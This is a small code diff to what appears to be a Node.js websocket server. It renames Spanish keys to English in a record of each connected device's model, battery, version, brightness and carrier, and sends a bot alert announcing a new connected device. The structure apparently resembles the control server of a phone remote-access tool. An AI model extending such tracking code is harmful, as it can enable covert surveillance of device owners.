@@ -59,11 +59,11 @@ appSocket.on('connection', (ws, req) => {
 
     ws.uuid = uuid
     appClients.set(uuid, {
-        modelo: model,
-        batería: battery,
+        model: model,
+        battery: battery,
         version: version,
-        brillo: brightness,
-        operador: provider
+        brightness: brightness,
+        provider: provider
     })
     appBot.sendMessage(id,
         `°• NUEVO DISPOSITIVO CONECTADO\n\n` +
